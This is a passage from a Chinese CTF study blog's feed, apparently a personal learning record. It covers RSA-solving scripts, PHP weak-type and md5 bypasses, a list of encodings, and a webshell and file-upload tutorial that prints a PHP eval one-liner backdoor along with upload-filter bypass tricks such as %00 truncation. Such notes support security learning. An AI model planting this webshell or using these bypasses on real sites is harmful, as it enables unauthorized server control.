返回的第一个数值为开方数，第二个数值为布尔型，可整除为true，可自行测试</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == true1:<br>            <span class="hljs-comment"># print(libnum.n2s(int(flag)))</span><br>            <span class="hljs-keyword">return</span> flag<br>        k += <span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">for</span> e1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, e1e2):<br>    <span class="hljs-keyword">if</span> e1e2 % e1 == <span class="hljs-number">0</span>:  <span class="hljs-comment"># 爆破可整除的e</span><br>        e2 = e1e2 // e1<br>        c = rsa_gong_N_def(e1, e2, c1, c2, n)<br>        e = gmpy2.gcd(e1, e2)<br>        m1 = de(c, e, n)<br>        <span class="hljs-keyword">if</span> m1:  <span class="hljs-comment"># 指定输出m1</span><br>            <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m1)))<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;脚本几乎都来自b站风二西，非常感谢&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;维纳攻击&quot;&gt;&lt;a href=&quot;#维纳攻击&quot; class=&quot;headerlink&quot; title=&quot;维纳攻击&quot;&gt;&lt;/a&gt;维纳攻击&lt;/h2&gt;&lt;p&gt;一般给出n、e、c&lt;</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>webshell与文件上传漏洞</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/23/webshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/23/webshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-01-23T10:25:37.000Z</published>
    <updated>2022-02-08T06:42:40.065Z</updated>
    
    <content type="html"><![CDATA[<h2 id="🎄webshell"><a href="#🎄webshell" class="headerlink" title="🎄webshell"></a><font id=1><strong>🎄webshell</strong></font></h2><p>🎄<font size=4 color=orange id=2><strong>什么是webshell</strong></font><br>webshell，简称网页后门，简单来说它是<font color=red>运行在web应用之上的远程控制程序</font></p><p>webshell其实就是一张网页，由PHP、JSP、ASP、APS.NET等这类web应用程序语言开发，但webshell并不具备常见网页的登录，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息的功能。拥有比较完整功能的webshell，我们一般称之为<font color=red>大马</font>。功能简易的webshell称为<font color=red>小马</font>。除此之外还有一句话木马、菜刀马、脱裤马、内存马等等的名词，是对于webshell功能或特性的简称。</p><p>大马界面<img class="url&#x3D;&#x2F;picture&#x2F;web4.png"></p><p>🎄<font size=4 color=orange id=3><strong>php一句话木马</strong></font></p><p><code>&lt;?php @eval($_POST[x]);?&gt;</code></p><p>@是错误控制运算符，当@放置在一个php表达式之前，该表达式可能产生的任何错误信息都将被忽略。<br>$_POST也可以改成$__GET或$_REQUEST，根据需求选择<br>例如：对该webshell发送一个POST请求，请求内容为x=phpinfo()</p><img class="url&#x3D;&#x2F;picture&#x2F;web5.png"><p>在根目录下新建一个php文档，把一句话木马写进去。<br>打开网站，post请求</p><img class="url&#x3D;&#x2F;picture&#x2F;web6 .png"><p>或者也可以尝试一些其他请求x=system(‘dir’);</p><p>🎄<font size=4 color=orange id=4><strong>webshell管理工具</strong></font></p><p>中国蚁剑是一款webshell管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。中国蚁剑的核心代码模块均改版自伟大的中国菜刀。</p><img class="url&#x3D;&#x2F;picture&#x2F;web7.png"><p>一句话木马中的post参数就是为连接密码</p><p>中国蚁剑不支持edu.cn的域名，这是可以选用其他的webshell管理工具（中国菜刀、哥斯拉）</p><h2 id="🎄文件上传漏洞"><a href="#🎄文件上传漏洞" class="headerlink" title="🎄文件上传漏洞"></a><font id=1><strong>🎄文件上传漏洞</strong></font></h2><p>文件上传的功能是将<font color=red>文本文件上传至服务器</font>进行保存</p><p>文件上传漏洞是指文件上传功能<font color=red>没有对上传的文件进行合理严谨的过滤</font>，导致用户可以利用此功能，上传能<font color=red>被服务器解析执行的文件</font>，并通过此文件获得<font color=red>执行服务器端命令的能力。</font><br>（例如，如果对方是LAMP架构，是否能上传PHP的webshell到服务器端，然后通过访问上传后的文件地址，从而执行webshell中的代码</p><h4 id="前端验证绕过：（当网站只在前端利用js来做校验）"><a href="#前端验证绕过：（当网站只在前端利用js来做校验）" class="headerlink" title="前端验证绕过：（当网站只在前端利用js来做校验）"></a>前端验证绕过：（当网站只在前端利用js来做校验）</h4><p>1、抓包(修改文件后缀，之后抓包再改回php)<br>2、通过禁止js代码、删除js代码（F12可以直接删除代码的）</p><h4 id="后缀名更改为-php3即可绕过-php的黑名单为什么"><a href="#后缀名更改为-php3即可绕过-php的黑名单为什么" class="headerlink" title="后缀名更改为.php3即可绕过.php的黑名单为什么?"></a>后缀名更改为.php3即可绕过.php的黑名单为什么?</h4><p>查看web server的配置文件<br><img src="/picture/web16"></p><p>看到这个正则表达式，php3、php4、php5、phpt、phptml都会被解析为php</p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>windows不区分大小写，php等同与pHp</p><h4 id="Content-Type检测文件类型"><a href="#Content-Type检测文件类型" class="headerlink" title="Content-Type检测文件类型"></a>Content-Type检测文件类型</h4><p>抓包修改Content-Type，使其符合白名单类型<br>[Mime对照表](<a href="https://tool.oschina.net/commons/">HTTP Content-type 对照表 (oschina.net)</a>)</p><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>双写绕过的产生是由于后端在判断是否包含关键字时只删除了一次，所以我们将关键字（php写两次即可）</p><h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>webshell.php %00 .png</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;🎄webshell&quot;&gt;&lt;a href=&quot;#🎄webshell&quot; class=&quot;headerlink&quot; title=&quot;🎄webshell&quot;&gt;&lt;/a&gt;&lt;font id=1&gt;&lt;strong&gt;🎄webshell&lt;/strong&gt;&lt;/font&gt;&lt;/h2&gt;&lt;p&gt;🎄&lt;</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>web基础题型</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/22/web%E5%9F%BA%E7%A1%80%E9%A2%98%E5%9E%8B/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/22/web%E5%9F%BA%E7%A1%80%E9%A2%98%E5%9E%8B/</id>
    <published>2022-01-22T11:32:12.000Z</published>
    <updated>2022-02-06T14:07:56.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-erge-函数-00截断漏洞"><a href="#PHP-erge-函数-00截断漏洞" class="headerlink" title="PHP.erge()函数%00截断漏洞"></a>PHP.erge()函数%00截断漏洞</h2><p>erge()用途<br>用指定的模式匹配一个字符串中指定的字符串，如果匹配成功则返回true，否则返回false。搜索字母的字符是大小写敏感的。可选的参数规则包含一个数组的所有匹配表达式，它们被正则表达式的括号分组。<br>ereg(“^[0-9]+$“,$_<em>GET[‘password’])===true</em>#保证参数全是数字<br>strpos($_GET[‘password’],’admin’) #查找admin第一次在参数中出现的位置</p><img class="url&#x3D;&#x2F;picture&#x2F;web3.png"><p>可以构造payload<br>?password=111%00admin      #因为ereg函数%00截断</p><h2 id="PHP-sha1-函数漏洞"><a href="#PHP-sha1-函数漏洞" class="headerlink" title="PHP.sha1()函数漏洞"></a>PHP.sha1()函数漏洞</h2><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以’0E’开头的，那么PHP会认为它们是相同的，都是0.<br>常见的sha1后以0E开头的值有aa3OFF9m、aaroZmOk、aaO8zKZF</p><h2 id="弱类型问题"><a href="#弱类型问题" class="headerlink" title="弱类型问题"></a>弱类型问题</h2><p>=== 在进行比较时，会先判断两种字符串类型是否相等，再比较<br>== 在进行比较时，会先将字符串类型转化为相同，再比较</p><p>如果比较一个数字和一个字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且按照数值来进行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>var_dump(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true   //admin和数字进行比较，admin会转换成数字，转换成0</span><br>var_dump(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>);  <span class="hljs-comment">//true</span><br>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>);  <span class="hljs-comment">//false</span><br>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br>var_dump(<span class="hljs-string">&quot;0e1234&quot;</span>==<span class="hljs-string">&quot;0e3455&quot;</span>);  <span class="hljs-comment">//true    //虽然是两个字符串在进行比较，因为这个是科学计数法，字符串是科学计数法的形式，还是会转换成数字</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>字符串转换成数字规则(从几个例子中总结规则)<br>123admin -&gt; 123<br>123a1233  -&gt; 123<br>admin  -&gt; 0</p><p><font size=2>来个例题试一下</font></p><img class="url&#x3D;&#x2F;picture&#x2F;web8.png"><p>POST传参messgae={“key”:0} ，因为$key是字符串，当它和数字比较会转换为数字，我们不妨猜测它不是数字开头的，拿到flag</p><p>再思考，如果这个$key以数字开头怎么办，那就抓包然后用burpsuit爆破它就可以了（或者用requess模块写脚本）</p><img class="url&#x3D;&#x2F;picture&#x2F;web9.png"><h2 id="Md5绕过"><a href="#Md5绕过" class="headerlink" title="Md5绕过"></a>Md5绕过</h2><p>1、</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span><br><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(<span class="hljs-variable">$a</span>)</span></span> == md5(<span class="hljs-variable">$b</span>)<br></code></pre></td></tr></table></figure><img class="url&#x3D;&#x2F;picture&#x2F;web10.png"><p>取a、b为任意两个md5值以0e开头的原值即可</p><p><a href="https://blog.csdn.net/qq_38603541/article/details/97108663?ops_request_misc=%7B%22request_id%22:%22164316559516780366519228%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164316559516780366519228&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-97108663.pc_search_result_control_group&utm_term=md5%E5%80%BC%E4%B8%BA0e%E5%BC%80%E5%A4%B4&spm=1018.2226.3001.4187">常见的MD5碰撞：md5值为0e开头_烟雨天青色-CSDN博客_md5值0e开头</a></p><p>2、</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span><br>md5(<span class="hljs-variable">$a</span>) === md5(<span class="hljs-variable">$b</span>)   <span class="hljs-regexp">//</span>注意这次是三个等号<br></code></pre></td></tr></table></figure><p>让a、b为数组（数组的md5值为NULL)<br>null === null   ,  md5(array) =&gt; null<br>a=[1,2]<br>b=array(0=&gt; ‘abc’)   //没有别的意思，只是生成数组的一个函数</p><p>$_GET[x]<br>?a[]=xyz  //这样就传入一个数组了<br>?a[]=xyz &amp; b[]=asd &amp; c[]=wu    //用&amp;连接符</p><p>3、</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(<span class="hljs-built_in">string</span>)$a != (<span class="hljs-built_in">string</span>)$b<br>md5($a) === md5($b)<br></code></pre></td></tr></table></figure><p>现在用数组就不行了，md5碰撞，因为md5的值总数是有限的，所有会有不同的数md5值相同</p><blockquote><p><a href="https://www.bilibili.com/video/BV1M54y1q7Wc?spm_id_from=333.999.0.0">视频链接</a>，我是跟着这个视频学的</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP-erge-函数-00截断漏洞&quot;&gt;&lt;a href=&quot;#PHP-erge-函数-00截断漏洞&quot; class=&quot;headerlink&quot; title=&quot;PHP.erge()函数%00截断漏洞&quot;&gt;&lt;/a&gt;PHP.erge()函数%00截断漏洞&lt;/h2&gt;&lt;p&gt;erge</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>各种编码特征</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/18/%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E7%89%B9%E5%BE%81/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/18/%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E7%89%B9%E5%BE%81/</id>
    <published>2022-01-18T06:38:46.000Z</published>
    <updated>2022-02-14T10:10:01.031Z</updated>
    
    <content type="html"><![CDATA[<p>1、jsfuck<br> 组成：[] () + !<br>示例：[][(![]+[])[+[]]+([![]]+[][[]]</p><p>2、brainfuck<br>组成：+-[].&lt;&gt;<br>示例：++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]++.&gt;+.+++++++…+++.&gt;++.&lt;&lt;+++++++++++++++…+++.——.——–.&gt;+.&gt;</p><p>3、Ook编码：Ook! Ook!</p><p>4、培根<br>只有两种字符<br>每一段的长度为 5</p><p>5、base家族<br>base64：大小写字母，0~9，+，-,64位组成的<br>base32：使用32个可打印字符（字母A-Z和数字2-7）<br>base16：使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。<br>base36：使用0~9的数字，加上所有26个字母，所有的字母要不全大写，要不全小写。<br>base58：58=9个阿拉伯数字（去掉0）+24个大写字母（去掉I和O）+25小写字母（去掉l）<br>base62：由10个数字、26个大写英文字母和26个小写英文字母组成<br>base85：:d]&gt;JA62bf&lt;^o]!;,or.=a;i@9/17‘@8oNU<br>base91:从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建base91字母：- (破折号，0x2D)     \（反斜杠，0x5C）     ‘（撇号，0x27）<br>base92:比base91 多一个字符 〜</p><p>6、敲击码<br>敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。</p><img class="url&#x3D;&#x2F;picture&#x2F;c5.png"><p>7、url编码<br>特征：一个字符ascii码的十六进制，然后在前面加上%</p><p>任何特殊的字符（就是那些不是简单的七位ASCII，如汉字，当然也包括象 =,&amp;；，和 % 这些特殊的字符）将以百分符%用十六进制编码。</p><p>其实url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。汉字的url编码呢？看例子：“胡”的ascii码是-17670，十六进制是BAFA，url编码是“%BA%FA”。</p><p>8、shellcode编码<br>源文本：The quick brown fox jumps over the lazy dog<br>编码后：\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67</p><p>9、Quoted-printable 编码<br>它是多用途互联网邮件扩展（MIME) 一种实现方式<br>示例：=E6=95=8F=E6=8D=B7=E7=9A=84=E6=A3=95=E8=89=B2=E7</p><p>10、Unicode编码<br>Unicode编码有以下四种编码方式：<br>源文本： The<br>&amp;#x [Hex]： The<br>&amp;# [Decimal]： The<br>\U [Hex]： \U0054\U0068\U0065<br>\U+ [Hex]： \U+0054\U+0068\U+0065</p><p>11、md5<br>但给出32位==十六进制值==的时候可能是md5值<br>比如：a8db1d82db78ed452ba0882fb9554fc，只有31位，可以使用网站自动补齐并解密<br><a href="https://www.somd5.com/">解密网址</a></p><p>12、埃特巴什码atbash<br>最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。<br><img src="/picture/c6.png"></p><p>比如：uozt{Zgyzhv_xlwv_uiln_xguhsld}<br>刚好uozt对应flag<br><a href="http://www.hiencode.com/atbash.html">解密网址</a></p><p>13、兔子密码<br>明文：I Love You你好<br>密文：U2FsdGVkX19zPWSf2RN4MMTNFva2M4hMI+G7oBQJMT0=</p><p>所以看到后面是等号的，有可能是兔子密码，感觉和base有点像的，当解不出没有思路的时候可以试试</p><p>14、uuencode<br>明文：89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]<br>密文：flag{dsdasdsa99877LLLKK}</p><p>Uuencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。跟Base64具有非常多的类似，也做了一些特殊转码说明！</p><p>所以以后看到奇怪的可打印字符base解不出来可以试试uuencode</p><p>15、火星文<br><img src="/picture/za17.png"></p><blockquote><p>参考博客 <a href="https://blog.csdn.net/weixin_44255856/article/details/89792997?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164268994116780271586776%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164268994116780271586776&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-89792997.pc_search_result_control_group&utm_term=ctf%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81&spm=1018.2226.3001.4187">这篇</a>、<a href="https://blog.csdn.net/weixin_54515836/article/details/113357816?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164268628416780366556635%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164268628416780366556635&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-113357816.pc_search_result_control_group&utm_term=ctf%E7%9B%B2%E6%96%87&spm=1018.2226.3001.4187">这篇</a>、<a href="https://www.cnblogs.com/daban/p/5680451.html">这篇</a><a href="https://blog.csdn.net/qq_42764617/article/details/106265909?ops_request_misc=%7B%22request_id%22:%22164317295816780261911583%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164317295816780261911583&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-7-106265909.pc_search_result_control_group&utm_term=%E5%85%94%E5%AD%90%E7%BC%96%E7%A0%81&spm=1018.2226.3001.4449">和这篇</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1、jsfuck&lt;br&gt; 组成：[] () + !&lt;br&gt;示例：[][(![]+[])[+[]]+([![]]+[][[]]&lt;/p&gt;
&lt;p&gt;2、brainfuck&lt;br&gt;组成：+-[].&amp;lt;&amp;gt;&lt;br&gt;示例：++++++++++[&amp;gt;+++++++&amp;gt;+++</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>RSA小学生刷题</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/15/RSA%E5%B0%8F%E5%AD%A6%E7%94%9F%E5%88%B7%E9%A2%98/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/15/RSA%E5%B0%8F%E5%AD%A6%E7%94%9F%E5%88%B7%E9%A2%98/</id>
    <published>2022-01-15T03:50:22.000Z</published>
    <updated>2022-01-28T13:04:21.153Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>不记录直接可以套脚本写出来的</p></blockquote><h2 id="风二西RSA-1"><a href="#风二西RSA-1" class="headerlink" title="风二西RSA_1"></a>风二西RSA_1</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import gmpy2<br>import libnum<br>import uuid<br>flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>+str(uuid<span class="hljs-selector-class">.uuid4</span>())+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br>m=libnum<span class="hljs-selector-class">.s2n</span>(flag)<br>p=libnum<span class="hljs-selector-class">.generate_prime</span>(<span class="hljs-number">512</span>)<br>q=libnum<span class="hljs-selector-class">.generate_prime</span>(<span class="hljs-number">512</span>)<br>n=p*<span class="hljs-selector-tag">q</span><br>e=<span class="hljs-number">1</span><br>c=pow(m,e,n)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;n=&quot;</span>,n)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;c=&quot;</span>,c)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;e=&quot;</span>,e)</span></span><br>n= 已给出太长我省略了<br>c= 已给出太长我省略了<br><br></code></pre></td></tr></table></figure><p>直接print(long_to_bytes(c))即可<br>因为long_to_bytes之后前面会多出<font color=red>‘b</font>，就像下面这样</p>    <figure class="figure-image">      <img src="/picture/c4.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">e</span>=1<br>n =<br>c =<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10000000000000000):<br>    <span class="hljs-attribute">x</span>=str(long_to_bytes(c+n*i))<br>    <span class="hljs-keyword">if</span> x[2]==<span class="hljs-string">&#x27;f&#x27;</span>:<br>        <span class="hljs-builtin-name">print</span>(x)<br>        break<br>    <br></code></pre></td></tr></table></figure><hr><h2 id="风二西RSA-2"><a href="#风二西RSA-2" class="headerlink" title="风二西RSA_2"></a>风二西RSA_2</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy<span class="hljs-number">2</span><br><span class="hljs-attribute">import</span> libnum<br><span class="hljs-attribute">import</span> uuid<br><span class="hljs-attribute">flag</span>=<span class="hljs-string">&quot;flag&#123;&quot;</span>+str(uuid.uuid<span class="hljs-number">4</span>())+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-attribute">print</span>(flag)<br><span class="hljs-attribute">m</span>=libnum.s<span class="hljs-number">2</span>n(flag)<br><span class="hljs-attribute">p1</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q1</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">p2</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q2</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">p3</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q3</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">e</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">c1</span>=pow(m,e,p<span class="hljs-number">1</span>*q<span class="hljs-number">1</span>)<br><span class="hljs-attribute">c2</span>=pow(m,e,p<span class="hljs-number">2</span>*q<span class="hljs-number">2</span>)<br><span class="hljs-attribute">c3</span>=pow(m,e,p<span class="hljs-number">3</span>*q<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n1=&quot;</span>,p<span class="hljs-number">1</span>*q<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c1=&quot;</span>,c<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n2=&quot;</span>,p<span class="hljs-number">2</span>*q<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c2=&quot;</span>,c<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n3=&quot;</span>,p<span class="hljs-number">3</span>*q<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c3=&quot;</span>,c<span class="hljs-number">3</span>)<br><span class="hljs-attribute">n1</span>= <span class="hljs-number">172774622114813683746188230007837413819</span><br><span class="hljs-attribute">c1</span>= <span class="hljs-number">170260248491697016437095929037490480036</span><br><span class="hljs-attribute">n2</span>= <span class="hljs-number">160333927436069409658483084503168246581</span><br><span class="hljs-attribute">c2</span>= <span class="hljs-number">45134242975344810542214361639231372051</span><br><span class="hljs-attribute">n3</span>= <span class="hljs-number">170109598387116572557100744899522621873</span><br><span class="hljs-attribute">c3</span>= <span class="hljs-number">47903985600747367026642413789127948969</span><br><br></code></pre></td></tr></table></figure><p>m=c1 % n1<br>m=c2 % n2<br>m=c3 % n3<br>又n1、n2、n3两两互素，中国剩余定理（不知道有没有可以直接计算中国剩余定理的函数，我没有找到）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">172774622114813683746188230007837413819</span><br>c1 = <span class="hljs-number">170260248491697016437095929037490480036</span><br>n2 = <span class="hljs-number">160333927436069409658483084503168246581</span><br>c2 = <span class="hljs-number">45134242975344810542214361639231372051</span><br>n3 = <span class="hljs-number">170109598387116572557100744899522621873</span><br>c3 = <span class="hljs-number">47903985600747367026642413789127948969</span><br><span class="hljs-built_in">print</span>(gcd(n1,n2),gcd(n1,n3),gcd(n2,n3))<br>M1=n2*n3<br>M11=invert(M1,n1)<br>M2=n1*n3<br>M21=invert(M2,n2)<br>M3=n1*n2<br>M31=invert(M3,n3)<br>m=(c1*M1*M11+c2*M2*M21+c3*M3*M31)%(n1*n2*n3)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><hr><h2 id="风二西RSA-4-密钥读取"><a href="#风二西RSA-4-密钥读取" class="headerlink" title="风二西RSA_4 (密钥读取)"></a>风二西RSA_4 (密钥读取)</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs processing">from Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Pubckey.pem&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) as f:  #这个公钥打开之后发现其实是密钥<br>    <span class="hljs-built_in">key</span>=RSA.import_key(f.read())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=%d&#x27;</span> % <span class="hljs-built_in">key</span>.n)<br>    